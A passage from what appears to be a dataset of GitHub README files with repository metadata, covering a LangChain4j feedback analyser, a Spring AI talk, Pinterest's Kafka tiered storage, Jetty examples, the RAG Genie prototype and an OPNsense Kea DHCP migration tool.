- Store the OpenAI API key as environment variable `OPENAI_API_KEY` or register it in `application.properties`, and restart your IDE if needed
- The dependencies for quarkus and it's LangChain4j integration are already in the `pom.xml` file.

### Running the Application
To run the application, execute the following command in the project root:
```bash
mvn quarkus:dev
```
### Observing the result
Enter your feedback at `http://localhost:8080/feedback.html`

Observe the analysis and chat with the results at `http://localhost:8080/dashboard.html`

### Stopping the Application
To stop the application, press Ctrl+C in the terminal
Database entries will be persisted even when stopping and restarting the application, 
unless you specify otherwise in `application.properties`.

### Development and hot loading
Changes to the java code and html files will be hot-reloaded, so you can see the changes immediately in your browser.

You can access the Quarkus Dev Console at `http://localhost:8080/q/dev/` to see the status of the application, set parameters and inspect the logs.

```PlainText
DISCLAIMER:
We tried to stay as close to plain java as possible for the LangChain4j services, to allow all developers, 
regardless of their usual framework, to understand whatâ€™s happening after they worked through the basic tutorial.

If you are building a deviated product yourself, it is recommended to exploit the configuration and injection options 
offered by the framework of your choice (Quarkus or Spring Boot) to the maximum.
At some places in the code, pointers for proper Quarkus use are given in the comments.

This demo is a work in progress and is currently missing features like proper logging, good error handling, 
observability, unit tests and documentation. It will come :)
```

## Goal of the project
The goal of this example is to give you a feel of the versatility of LangChain4j capabilities in a real-world set-up.
What I hope you will take over for your own projects:
- A range of AiService usages (RAG-powered chat, splitter, analyser returning POJO)
- How to use LangChain4j with a front-end (endpoints and chatsocket)
- Persisting AI-processed data to both a classical database (SQLite) and an embedding store (InMemoryEmbeddingStore)
- Set-up of a webservice wrapper around plain LangChain4j code (Quarkus in this case, similar for Spring Boot) and itâ€™s lifecycle aspects (StartupService, sessions, applicationScoped)
- Adapt our html to your use case
- Generating a Docker Image

What I hope you will do better:
- Add testing, proper error handling, logging and observability
- Exploit the configuration and injection capabilities of your framework better (LangChain4j has integrations with Quarkus or Spring Boot)
- Call your repo analyZer with a z...


## Feedback Analyser Architecture and Classes

The feedback analyser is intended to register feedback from users within a certain scope 
(in this case, a coding lab with around 60 users), to automatically tag and annotate it,
and in a second step to let organizers explore the feedback with a dashboard and a chat assistant.

The application consists of two distinct steps:
### 1. Feedback gathering and annotation
The users enter their feedback and a couple of additional fields at `/feedback.html`. 
They can put different complaints in one text field.

<img src='src/main/resources/images/feedback_form.png' width=""400"">

The form input gets sent to `/api/feedback` that
A) splits the original `UserFeedback` in pieces that are on one single topic, which we call `AtomicFeedback`
B) for each `AtomicFeedback` text, the model annotates it with a FeedbqckType, Categories, and some measures like severity and urgency.

<img src='src/main/resources/images/atomicfeedback.png' width=""400"">

C) stores the `UserFeedback` and linked `AtomicFeedbacks` in an SQLite Database
D) calculates an embedding (semantic vector - see RAG pattern) for every `AtomicFeedback` text and stores is in an `InMemoryEmbeddingStore`

This image illustrates the two main data containers (POJOs) that we use

<img src='src/main/resources/images/userfeedb_atomifeedb.jpg' alt='UserFeedback and AtomicFeedback Objects' width=""500"">


### 2. Feedback corpus exploration with dashboard and chat assistant
In a second step, the organizers can inspect all the feedback via
A) a dashboard that calls /api/dashboard which in its turn queries the SQLite Database, in order to visualise all the feedback

<img src='src/main/resources/images/dashboard.png' width=""300"">

B) a chatbot that will give an informed answer because it will semantically search similar feedback parts to the user question.
It is currently configured to take at most the 10 most relevant pieces of feedback into account when answering.
On top of this, it will automatically filter on certain aspects of the metadata, such as gender.

<img src='src/main/resources/images/chatassistant.png' width=""400"">

## Understanding the parts better

### The AI Services

`FeedbackSplitterAIService.java` contains the AI Service interface for splitting the `UserFeedback` in coherent parts
`FeedbackAnalyserAIService.java` contains the instruction for analysing each small feedback part and annotate it with categories, severity, category, etc.
`FeedbackChatAIService.java` contains the AI Service for the chat assistant. It will be extended with memory, content retriever etc. as described below.

### The Content Retriever for the Chatbot
Each AtomicFeedback text get stored as vector + original segment in our `InMemoryEmbeddingStore`, 
together with some metadata of interest, such as gender, birthyear, categories, etc.

For retrieving relevant segments, we implemented a basis of naive RAG 
(= calculate the vector of the question and use the 10 best matching segments to help the LLM construct its answer).
We added a layer of metadata filtering on fields like birthyear and gender, 
and let the LLM take care of writing the appropriate filter for the questions.

The code handling the retriever and metadata filter can be found in `ChatSocket.java`.


### The SQLite database

We are setting up an SQLite database. This will allow us to store our database data in a file stored_feedback.db, 
within in our project. 
Stored_feedback.db is listed under .gitignore, 
so make sure to remove it from there if you would want to push your collected data to your repo.

In the normal cycle, upon application startup, the class StartupService.java 
will make sure the database tables are present by running create_tables.sql and create_categories.sql. 
If the database file is not yet there, it will be created in the folder resources/META-INF.resources. 
If the tables are already there, nothing will happen. Thatâ€™s some of the conveniences of SQLite :)
You can inspect whatâ€™s in your database by opening stored_feedback.db and if needed, 
install an IDE plugin to have a proper look at the data in there.

If during development, you make changes to the schema, or if you want to wipe your data, 
you can use the property `app.database.reset` (default `false`) to force a run of `drop_tables.sql` 
before re-initializing the database. Donâ€™t forget to set the property back to `false` afterwards.

If you want to load some demo data, use the property `app.database.prepopulate` (default `false`) 
to indicate that the file `populate_with_demo_data.sql` has to be run on startup. 
Donâ€™t forget to set the property back to false afterwards.

When stopping the application (`Ctrl+C`), the database stays intact.

### The Frontend

The frontend consists html files under `src/main/resources/META-INF.resources`. 
The Quarkus framework will ensure these are served on `/filename.html`

There are two static html files (`feedback.html`,`dashboardwithchat.html`) 
and one React html file (`dashboard.html`) with it's scripts under `/assets`.

The static html files are built with `tailwind CSS` so it adapts to the screen width (reactivity). 
This static html should be easy to adapt for your own use case.

In `feedback.html` youâ€™ll find an example of a webform content `POST` (JSON format), 
that will also handle the response of the backend and show it in the UI.
To see what this gives in the UI, run the application and go to `localhost:8080/feedback.html`

<img src='src/main/resources/images/feedback_form.png' width=""300"">
<img src='src/main/resources/images/atomicfeedback.png' width=""300"">

A part of the frontend (`dahsboard.html`) is in React, which is harder and rather unadaptable, 
but illustrates the possibilities better.

<img src='src/main/resources/images/dashboard.png' width=""300"">
<img src='src/main/resources/images/chatassistant.png' width=""400"">

To give you a starting point for your own WebSocket handling on the frontend side (needed to build a chatbot), 
we left the example `dashboardwithchat.html` in (observe on `localhost:8080/dashboardwithchat.html`).

### The Endpoints
- `FeedbackController`: at `/api/feedback` receiving `UserFeedback` in JSON and returning analysed `AtomicFeedbacks` in JSON
- `DashboardController`: at `/api/dashboard` returning a JSON objects containing some statistics and all AtomicFeedbacks
- `ChatSocket`: websocket at `/api/chat` returning original user question + AI answer

## Further Resources
For a deeper dive, have a look at:
- [LangChain4j Documentation](https://github.com/langchain4j/langchain4j-examples/tree/main/tutorials/src/main/java)
- [Tutorials](https://github.com/langchain4j/langchain4j-examples/tree/main/tutorials/src/main/java)
- [Examples for all dependencies and frameworks integrating with LangChain4j](https://github.com/langchain4j/langchain4j-examples/tree/main/other-examples/src/main/java)
- [LangChain4j Repo](https://github.com/langchain4j/langchain4j) 
- TODO link to community examples
",0,0,3,9.0,"['feedback', 'analyser', 'application', 'project', 'setup', 'prerequisite', 'setup', 'rocket', 'if', 'want', 'bother', 'local', 'setup', 'local', 'setup', 'run', 'application', 'observe', 'result', 'stop', 'application', 'development', 'hot', 'loading', 'goal', 'project', 'feedback', 'analyser', 'architecture', 'class', 'feedback', 'gathering', 'annotation', 'feedback', 'corpus', 'exploration', 'dashboard', 'chat', 'assistant', 'understand', 'part', 'well', 'the', 'ai', 'service', 'the', 'content', 'retriever', 'chatbot', 'the', 'sqlite', 'database', 'the', 'frontend', 'the', 'endpoint', 'further', 'resource']","['the', 'feedback', 'setup', 'application', 'analyser']",1.0,"[${quarkus.platform.group-id}:quarkus-maven-plugin,maven-compiler-plugin,maven-failsafe-plugin,maven-surefire-plugin]",0.0,1.0,0.0
danvega/spring-into-ai,main,"# Spring Into AI

It's impossible to spend a day in tech without hearing the words ""Artificial Intelligence"". In this presentation we will embark on a journey into the world of Artificial Intelligence (AI) specifically designed for beginners. We'll start by introducing the fundamental concepts of AI, demystifying its jargon, and exploring its potential impact on our everyday lives.

Next, we will explore Spring AI. Its goal is to simplify the development of applications that incorporate artificial intelligence functionality, without introducing unnecessary complexity. We will cover the basics of setting up a Spring AI project, how to integrate it with existing Spring Boot applications, and how to use its various components to implement common AI tasks.

Whether you want to add chatbots to your app, generate recommendations, or analyze sentiments in text, Spring AI provides a streamlined and efficient approach to integrating these features. By the end of this talk, you will have a solid grasp of AI basics and how to incorporate them into your Spring applications using Spring AI.
",0,0,1,1.0,"['spring', 'into', 'ai']","['spring', 'into', 'ai']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
pinterest/tiered-storage,main,"# Pinterest Tiered Storage for Apache KafkaÂ®
Pinterest Tiered Storage for [Apache KafkaÂ®](https://kafka.apache.org/) is a broker-independent framework that allows brokers
to offload finalized log segments to a remote storage system. 
This allows Apache KafkaÂ® to maintain a smaller disk footprint and reduce the need for expensive storage on the brokers. 
The framework also provides a consumer client that can consume from both the broker and the remote storage system.

Pinterest's implementation of Tiered Storage for Apache KafkaÂ® provides a ***broker-independent*** approach to Tiered Storage.
***See the differences between [Pinterest vs. Apache KafkaÂ® Tiered Storage](#pinterest-vs-apache-kafka-tiered-storage)***.

It consists of two main components:
1. [Uploader](ts-segment-uploader): A continuous process that runs on each Apache KafkaÂ® broker and uploads finalized log segments to a remote storage system (e.g. Amazon S3, with unique prefix per cluster and topic).
2. [Consumer](ts-consumer): A consumer client capable of consuming from both Tiered Storage log segments and Apache KafkaÂ® cluster.

A third module [ts-common](ts-common) contains common classes and interfaces that are used by the `ts-consumer` and `ts-segment-uploader` modules, such as Metrics, StorageEndpointProvider, etc.

Feel free to read into each module's README for more details.

# Why Tiered Storage?
[Apache KafkaÂ®](https://kafka.apache.org/) is a distributed event streaming platform that stores partitioned and replicated log segments on disk for
a configurable retention period. However, as data volume and/or retention periods grow, the disk footprint of Apache KafkaÂ® clusters can become expensive. 
Tiered Storage allows brokers to offload finalized log segments to a more cost-effective remote storage system, reducing the need for expensive storage on the brokers.

With Tiered Storage, you can:
1. Maintain a smaller overall broker footprint, reducing operational costs
2. Retain data for longer periods of time while avoiding horizontal and vertical scaling of Apache KafkaÂ® clusters
3. Reduce CPU, network, and disk I/O utilization on brokers by reading directly from remote storage

## Pinterest vs. Apache KafkaÂ® Tiered Storage
### Apache KafkaÂ® Tiered Storage
[KIP-405](https://cwiki.apache.org/confluence/display/KAFKA/KIP-405%3A+Kafka+Tiered+Storage?uclick_id=11f222c6-967b-4935-98a9-cc88aafad7f5)
provides a native, open-source offering to Tiered Storage for Apache KafkaÂ® and is available starting from Apache KafkaÂ® 3.6.0.
The native Tiered Storage implementation is broker-dependent, meaning that the broker process itself is responsible 
for offloading finalized log segments to remote storage, and the ***broker is always in the critical path of consumption***.

### Pinterest Tiered Storage: Skip the broker
***Pinterest's implementation of Tiered Storage is broker-independent***, meaning that the Tiered Storage process runs as a separate process alongside the Apache KafkaÂ® server process,
***and the broker is not always in the critical path of consumption***.
This allows for more flexibility in adopting Tiered Storage, and better accommodates unpredictable consumption patterns. 
Some of the key advantages of a broker-independent approach are:

1. **You don't need to upgrade brokers**: While the native offering requires upgrading brokers to a version that supports Tiered Storage, a broker-independent approach does not.
2. **You can skip the broker entirely during consumption**: When in `TIERED_STORAGE_ONLY` mode, the consumption loop does not touch the broker itself, allowing for more
unpredictable spikes in consumption patterns without affecting the broker. See [MemQ](https://github.com/pinterest/memq) for a PubSub system that uses this approach natively.
3. **Support consumer backfills and replays without affecting broker CPU**: When the broker is out of the critical path of consumption,
consumer backfills and replays can be done without needing to keep additional CPU buffer on the brokers just to support those surges.
4. **Avoid cross-AZ transfer costs**: While the native approach adds a cross-AZ network cost factor for consumers that are not AZ-aware,
this broker-independent approach avoids that cost for all consumers when reading directly from remote storage.
5. **Faster adoption, iteration, and improvements**: A broker-independent Tiered Storage solution lets you adopt and upgrade Tiered Storage without
waiting for Apache KafkaÂ® upgrades. Improvements, bug fixes, and new features are released independently of Apache KafkaÂ® releases.

# Highlights
- **Broker Independent**: The tiered storage solution is designed to be broker-independent. [Here's why we think it's better](#pinterest-tiered-storage-for-apache-kafka).
- **Skip the broker entirely during consumption**: The consumer can read from both broker and Tiered Storage backend filesystem. When in `TIERED_STORAGE_ONLY` mode, the consumption loop does not touch the broker itself, allowing for reduction in broker resource utilization.
- **Pluggable Storage Backends**: The framework is designed to be backend-agnostic.
- **S3 Partitioning**: Prefix-entropy (salting) is configurable out-of-the-box to allow for prefix-partitioned S3 buckets, allowing for better scalability by avoiding request rate hotspots.
- **Fault Tolerant**: Broker restarts, replacements, leadership changes, and other common Apache KafkaÂ® operations / issues are handled gracefully.
- **Metrics**: Comprehensive metrics are provided out-of-the-box for monitoring and alerting purposes.

# Quick Start
Detailed quickstart instructions are available [here](docs/quickstart.md).

# Usage
Using Pinterest Tiered Storage for Apache KafkaÂ® consists of the following high-level steps:
1. Have a remote storage system ready to accept reads and writes of log segments (e.g. Amazon S3 bucket)
2. Configure and start [ts-segment-uploader](ts-segment-uploader) on each Apache KafkaÂ® broker
3. Use [ts-consumer](ts-consumer) to read from either the broker or the remote storage system
4. Monitor and manage the tiered storage system using the provided metrics and tools

Feel free to read into each module's README for more details.

# Architecture
![Architecture](docs/images/architecture.png)

# Current Status
**Pinterest Tiered Storage for Apache KafkaÂ® is currently under active development and the APIs may change over time.**

It currently supports the following remote storage systems:
- Amazon S3

Some planned features and improvements:

- KRaft support
- More storage system support (e.g. HDFS)
- Integration with [PubSub Client](https://github.com/pinterest/psc) (backend-agnostic client library)

Contributions are always welcome!

# Ecosystem
Check out some of the other Pinterest projects designed to make PubSub more automated, efficient, and reliable:
- [PubSub Client](https://github.com/pinterest/psc): A backend-agnostic client library for PubSub systems
- [MemQ](https://github.com/pinterest/memq): An efficient, scalable cloud native PubSub system
- [Orion](https://github.com/pinterest/orion): A generalized and pluggable management and automation platform for stateful distributed systems, such as Apache KafkaÂ® and MemQ

# Maintainers
- Vahid Hashemian
- Jeff Xiang

# License
Pinterest Tiered Storage for Apache KafkaÂ® is distributed under Apache License, Version 2.0.

# Trademark
ApacheÂ®ï¸, Apache Kafka, and Kafka are trademarks of the Apache Software Foundation.
",0,0,9,4.0,"['pinterest', 'tiered', 'storage', 'apache', 'why', 'tiered', 'storage', 'pinterest', 'apache', 'tiered', 'storage', 'apache', 'tiered', 'storage', 'pinterest', 'tiered', 'storage', 'skip', 'broker', 'highlight', 'quick', 'start', 'usage', 'architecture', 'current', 'status', 'ecosystem', 'maintainer', 'license', 'trademark']","['tiered', 'storage', 'pinterest', 'apache', 'why']",5.0,"[maven-dependency-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,4.0,1.0
jetty/jetty-examples,12.0.x,"![jetty logo](https://raw.githubusercontent.com/jetty/jetty.project/jetty-12.0.x/logos/jetty-logo-200.png)

[![12.0.x](https://github.com/jetty/jetty-examples/actions/workflows/ci.yml/badge.svg?branch-12.0.x)](https://github.com/jetty/jetty-examples/actions/workflows/ci.yml)

# Eclipse JettyÂ® - Examples

This is a collection of examples of how to use various features
present in the Eclipse Jetty server and Eclipse Jetty client.

There are a few major categories of examples.
## Embedded Examples

Using Embedded Jetty is extremely powerful way to include Jetty
in your Java application using Code (instead of configuration) to
setup a Jetty server or Jetty client.

Here you will see answers to common questions about how to 
integrate various features of Jetty, and also how to enable features
of 3rd party libraries within Jetty (such as JSP, REST, and CDI).

See [embedded/README.md][7] for a breakdown of embedded examples.

## Standalone Examples

The Standalone examples present fully formed `${jetty.base}` directories
that can be used to understand how to configure the jetty module system
and its various components to reach an end goal.

See [standalone/README.md][8] for a breakdown of standalone examples.

## Webapp Examples

A collection of various WAR files that can be used to demonstrate
how to use web and JVM features in Jetty.

See [webapps/README.md][9] for a breakdown of webapp examples.

---

### All Example Branches

| Branch       | Min JDK | EE   | Servlet | Namespace         | Supported                               |
|--------------|---------|------|---------|-------------------|-----------------------------------------|
| [12.0.x][6]  | 17      | EE10 | 6.0     | `jakarta.servlet` | Yes                                     |
| [12.0.x][6]  | 17      | EE9  | 5.0     | `jakarta.servlet` | Yes                                     |
| [12.0.x][6]  | 17      | EE8  | 4.0     | `javax.servlet`   | Yes                                     |
| [11.0.x][1]  | 11      | EE9  | 5.0     | `jakarta.servlet` | No (as of January 2024) [See #10485][4] |
| [10.0.x][2]  | 11      | EE8  | 4.0     | `javax.servlet`   | No (as of January 2024) [See #10485][4] |
| [9.4.x][3]   | 8       | EE7  | 3.1     | `javax.servlet`   | No (as of June 2022) [See #7958][5]     |

[1]: https://github.com/jetty/jetty-examples/tree/11.0.x
[2]: https://github.com/jetty/jetty-examples/tree/10.0.x
[3]: https://github.com/jetty/jetty-examples/tree/9.4.x
[4]: https://github.com/jetty/jetty.project/issues/10485
[5]: https://github.com/jetty/jetty.project/issues/7958
[6]: https://github.com/jetty/jetty-examples/tree/12.0.x
[7]: embedded/README.md
[8]: standalone/README.md
[9]: webapps/README.md",0,0,19,1.0,"['eclipse', 'example', 'embed', 'example', 'standalone', 'example', 'webapp', 'example', 'all', 'example', 'branch']","['example', 'eclipse', 'embed', 'standalone', 'webapp']",64.0,"[org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.eclipse.jetty.ee10:jetty-ee10-maven-plugin]",10.0,45.0,9.0
stephanj/rag-genie,master,"# RAG Genie

## About

The RAG Genie, an LLM RAG prototype to test and evaluate your embeddings, chunk splitting strategies using Q&A and evaluations. 

https://github.com/stephanj/rag-genie/assets/179457/e154a2ba-b031-4c62-adb4-fc87c7d448da

## Contribute

To contribute to this project, please read the [contribution guidelines](CONTRIBUTING.md).
Also make sure to read the [translation guidelines](TRANSLATION.md) if you want to contribute to the translations.

## Useful links

* [ChangeLog](CHANGELOG.md)
* [Github project](https://github.com/stephanj/rag-genie/)

## Configure your development environment

### Install Taskfile.dev

Taskfile is a task runner / build tool that aims to be simpler and easier to use than, for example, GNU Make.

If you're on macOS or Linux and have [Homebrew](https://brew.sh/) installed, just run:

    brew install go-task

Otherwise, you can follow the [installation instructions](https://taskfile.dev/installation/) for your platform.

You can list all available tasks with:

    > task

    task: Available tasks for this project:

    * clean:                                ğŸ§½ Clean generated code and binaries
    * default:                              ğŸ“ List all tasks
    * genie:backend:start:                  ğŸƒ Start Genie Spring Boot backend
    * genie:backend:start:prod:             ğŸƒ Start Genie Spring Boot backend in production mode
    * genie:build:                          ğŸ—ï¸ Build the app (tests are skipped) (aliases: build)
    * genie:build:prod:                     ğŸ— Build the app (tests are skipped) in production mode
    * genie:frontend:build:                 ğŸ—ï¸ Build Genie Node/Angular frontend
    * genie:frontend:start:                 ğŸƒ Start Genie Node/Angular frontend
    * genie:frontend:sync:                  ğŸ‘€ Build Genie Node/Angular frontend in watch mode
    * genie:release:                        ğŸ“¦ Release a new Genie version (automatically selected)                      (aliases: release)
    * genie:release:alpha:                  ğŸ“¦ Release a new Genie pre-release alpha version                             (aliases: release:alpha)
    * genie:release:beta:                   ğŸ“¦ Release a new Genie pre-release beta version                              (aliases: release:beta)
    * genie:release:major:                  ğŸ“¦ Release a new Genie major version                                         (aliases: release:major)
    * genie:release:minor:                  ğŸ“¦ Release a new Genie minor version                                         (aliases: release:minor)
    * genie:release:patch:                  ğŸ“¦ Release a new Genie patch version                                         (aliases: release:patch)
    * genie:start:                          ğŸƒ Start Genie                                                               (aliases: start)
    * genie:start:prod:                     ğŸƒ Start Genie locally in production mode (triggers a full clean build)      (aliases: start:prod)
    * genie:test:                           âœ… Test the app                                                              (aliases: test)
    * clean:full:                           ğŸ§½ Clean generated code, binaries including Node and its modules
    * db:drop:                              ğŸ§½ Stop and remove all services data (PostgreSQL)
    * db:dump:                              â¬‡ï¸ Dump data from local PostgreSQL instance
    * db:import:                            â¬†ï¸ Import data into local PostgreSQL instance
    * db:liquibase:clear-checksums:         ğŸ§½ Clear Liquibase checksums
    * db:liquibase:update:                  âš™ï¸ Update local database with Liquibase changes
    * db:liquibase:validate:                â˜‘ï¸ Validate local database with Liquibase changes
    * db:restart:                           ğŸ”„ Restart PostgreSQL db
    * db:start:                             ğŸƒ Start PostgreSQL db
    * db:status:                            ğŸš¦ PostgreSQL db status
    * db:stop:                              ğŸ›‘ Stop PostgreSQL db
    * env:setup:                            ğŸ› ï¸ Setup the project environment
    * env:verify:                           â˜‘ï¸ Verify the project environment setup

If you want to see the commands executed by a task, you can use the `--dry-run` option:

    task --dry genie:build

### Verify your environment

To verify your environment is compatible with the project, run the following command:

    task env:verify

### Setup your environment

You can manually setup your environment by following feedback from the `env:verify` task 
or you can run the following command to let us doing the setup:

    task env:setup

The script will install all required tools and dependencies and supports the following package managers:

* [ASDF](https://asdf-vm.com/) - preferred when available as it supports a large set of tools and versions
* [SDKMAN](https://sdkman.io/) - used when ASDF is not available to setup Java
* [Homebrew](https://brew.sh/) - used when others are not available. It will change the default version of the required tools on your system which is why ASDF or SDKMAN are preferred.

## Build and execute automated tests

The project uses [Apache Maven](https://maven.apache.org/) as build tool and [JUnit 5](https://junit.org/junit5/) as test framework.

To build the project without running the tests, run the following command:

    task build

The application is packaged as a [Spring Boot](https://spring.io/projects/spring-boot) executable jar file.
You can find the jar file in the `target` directory, it is compiled in `dev` mode.

To build it in production mode, run the following command:

    task genie:build:prod

To build the project and execute the tests, run the following command:

    task test

## Run Locally

### Environment variables

First create a `.env` file in the root of the project by copying the sample file as follows:

    copy .env.example .env

Update the content of `.env` with the correct values provided by a project administrator.

You can also use `.env` to override the default values from `.env.default`.

You can pass to the application any configuration parameter as described in [Spring Boot documentation](https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.external-config). 

One mandatory env variable is GENIE_SECURITY_KEY_SECRET which is used to encrypt the API keys into the database.

The length of this key should be 32 characters (for 256-bit key) to work correctly with the AES encryption algorithm.

The following command will create a 32 characters keys

```
openssl rand -base64 32
``` 

### Start Genie

To start the application, run the following command:

    task start

The application is available at [http://localhost:8080](http://localhost:8080).

Launch in dev mode with hot reload enabled.
Any change in the code will be automatically reloaded.
Frontend code is automatically compiled using [Webpack](https://webpack.js.org/) and **[LiveReload](https://chromewebstore.google.com/detail/livereload/jnihajbhpnppcggbcgedagnkighmdlei?hl=fr) is used to reload the page when any change is detected (just install the browser extension and enable it on the website).**
We also advise installing the [Angular DevTools](https://chromewebstore.google.com/detail/angular-devtools/ienfalfjdbdpebioblfackkekamfmbnh) extension to debug the Angular application.

### Production mode

To build and launch the application in production mode, run the following command:

    task start:prod

### Manage the local database manually

You can start it with:

    task db:start

Restart it with:

    task db:restart

Stop it with:

    task db:stop

Check its status with:

    task db:status

Drop its content with:

    task db:drop

Dump its content with:

    task db:dump

### Liquibase Usage

Liquibase is used to manage the database schema.

You can update the database schema with the following command:

    task db:liquibase:update

You can also validate the database schema with the following command:

    task db:liquibase:validate

You can clear the checksums so liquibase can update from a fresh start with the following command:

    task db:liquibase:clear-checksums

By default, liquibase-maven-plugin is configured to target the local DB defined as

    <liquibase.url>jdbc:postgresql://localhost:5432/postgres</liquibase.url>
    <liquibase.username>postgres</liquibase.username>
    <liquibase.password>mysecretpassword</liquibase.password>

#### Liquibase table updates

Make sure to use changesets to add new columns or indexes

for example

     <changeSet id=""20231019-1171"" author=""stephan"">

        <addColumn tableName=""genie_content"">
            <column name=""enable_tags"" type=""boolean"" defaultValue=""false"">
                <constraints nullable=""true"" />
            </column>
        </addColumn>
    </changeSet>

### Frontend environment

To build individual the frontend (in production mode), run the following command:

    task genie:frontend:build

And you can launch the frontend in dev mode with:

    task genie:frontend:start

Then you need to start the backend with the following command:

    task genie:backend:start

Use `npm` and `npx` wrappers to manually run any command like `./npm run start` or `./npx webpack`.

## Release a new version

To release a new version, run the following command:

    task release

The release automation:

* updates the version in the `pom.xml` file,
* updates the version in the `package.json`/`package-lock.json` file,
* updates the CHANGELOG.md file,
* commits the changes,
* tags the commit,
* proposes to push the commit and the tag to the remote repository.

`task release` is selecting the next version (`X.Y.Z`) based on changes since the last release.

It is following the [Conventional Commits](https://www.conventionalcommits.org/en/v1.0.0/) convention.

If there is a commit with a breaking change it will increase to the next major version (X) :

> **BREAKING CHANGE:** a commit that has a footer `BREAKING CHANGE:`, or appends a `!` after the type/scope, introduces a breaking API change (correlating with [**`MAJOR`**](http://semver.org/#summary) in Semantic Versioning). A BREAKING CHANGE can be part of commits of any _type_.

else if a commit contains a feature it will increase to the next feature version (Y):

> **feat:** a commit of the _type_ `feat` introduces a new feature to the codebase (this correlates with [**`MINOR`**](http://semver.org/#summary) in Semantic Versioning).

otherwise it will increase to the next patch version (Y):

> **fix:** a commit of the _type_ `fix` patches a bug in your codebase (this correlates with [**`PATCH`**](http://semver.org/#summary) in Semantic Versioning).
>
> types other than fix: and feat: are allowed, for example @commitlint/config-conventional (based on the Angular convention) recommends build:, chore:, ci:, docs:, style:, refactor:, perf:, test:, and others.

**Rollback a release:** After release you are asked to confirm to push the release commit and tag to gitlab. You can always refuse it and cancel the release by removing the release commit (`git reset --hard HEAD~1`) and the tag (`git tag --delete vX.Y.Z`)

You can also manually select the version to release with the following command:

    task release:patch # To force the creation of a patch version
    task release:minor # To force the creation of a minor version
    task release:major # To force the creation of a major version

    task release:alpha # To force the creation of a pre-release alpha version (X.Y.Z-alpha.N)
    task release:beta # To force the creation of a pre-release beta version (X.Y.Z-beta.N)

## Conventional Commits

We are using [Conventional Commits](https://www.conventionalcommits.org/en/v1.0.0/) for commit messages.

The commit message should be structured as follows:

    <type>[optional scope]: <description>

    [optional body]

    [optional footer(s)]

Common types are:

* **Feature (`feat`)**: A commit of this type introduces a new feature to the codebase. This correlates with a [**`MINOR`**](http://semver.org/#summary) version in Semantic Versioning.
* **Fix (`fix`)**: A commit of this type patches a bug in your codebase. This correlates with a [**`PATCH`**](http://semver.org/#summary) version in Semantic Versioning.
* **Documentation (`docs`)**: A commit of this type only affects documentation.
* **Refactor (`refactor`)**: A commit of this type involves code refactoring, which neither fixes a bug nor adds a feature.
* **Style (`style`)**: A commit of this type pertains to formatting, white-space, or other changes that do not affect the meaning of the code.
* **Chore (`chore`)**: A commit of this type includes changes that do not relate to a fix or feature and do not modify source or test files. For example, updating dependencies.
* **Performance (`perf`)**: A commit of this type enhances performance.
* **Test (`test`)**: A commit of this type either adds missing tests or corrects existing tests.
* **Build (`build`)**: A commit of this type affects the build system or external dependencies. Example scopes include gulp, broccoli, npm.
* **Continuous Integration (`ci`)**: A commit of this type affects the continuous integration system configuration.
* **Revert (`revert`)**: A commit of this type reverts a previous commit.

**BREAKING CHANGE**: a commit that has a footer `BREAKING CHANGE:`, or appends a `!` after the type/scope, introduces a breaking API change (correlating with [**`MAJOR`**](http://semver.org/#summary) in Semantic Versioning). A BREAKING CHANGE can be part of commits of any _type_.

Optional scopes can be anything specifying the place of the commit change. For example, it can be the reference of a ticket like `#1234`.

Example:

    feat(#1234): allow provided config object to extend other configs

    BREAKING CHANGE: `extends` key in config file is now used for extending other config files

    closes #1234
",0,1,3,7.0,"['rag', 'genie', 'about', 'contribute', 'useful', 'link', 'configure', 'development', 'environment', 'install', 'verify', 'environment', 'setup', 'environment', 'build', 'execute', 'automate', 'test', 'run', 'locally', 'environment', 'variable', 'start', 'genie', 'production', 'mode', 'manage', 'local', 'database', 'manually', 'liquibase', 'usage', 'liquibase', 'table', 'update', 'frontend', 'environment', 'release', 'new', 'version', 'to', 'force', 'creation', 'patch', 'version', 'to', 'force', 'creation', 'minor', 'version', 'to', 'force', 'creation', 'major', 'version', 'to', 'force', 'creation', 'alpha', 'version', 'to', 'force', 'creation', 'beta', 'version', 'conventional', 'commits']","['version', 'environment', 'to', 'force', 'creation']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.eirslett:frontend-maven-plugin,io.github.git-commit-id:git-commit-id-maven-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jacoco:jacoco-maven-plugin,org.liquibase:liquibase-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
EasyG0ing1/Migration,main,"# Migration

Migration is a utility that will take your static IP address mappings in OPNsense and migrate them over to the Kea DHCP server that comes with OPNsense version 24.

- **You <u>must</u> upgrade to OPNsense version 24 before using this utility**

### Here is a video tutorial if that works best for you

[<img src=""img/VideoThumb.png"" width=""100%"">](https://youtu.be/9yLQezDKVoY)

### This is a simple tool to use:

1) [Download the program](https://github.com/EasyG0ing1/Migration/releases/latest) for your operating system (they are native binaries, no need for a Java runtime environment).
    * Create a clean folder to put the program in
2) From your OPNsense interface, go to Services / Kea DHCP / Kea DHCPv4 Then Subnets on the right
3) Define all of your subnets and their IP Pools.
    * The tool uses those newly created subnets to automatically assign your current reservations to the correct subnet.
4) Apply those changes
5) Go to System / Configuration / Backups
6) Click on Download Configuration
    * Save the file as `config.xml` in the same folder you downloaded to tool into
    * Make a copy of it just in case
7) Open a shell (cmd.exe or terminal etc.) and go into that folder
8) run `migrate`
    - You should see that the file `new_config.xml` has been created
    - If you don't then you will see a description of some problem that was found which will help you understand what needs to be fixed in your config.xml file
9) Go back into OPNsense under backups and restore this new file.
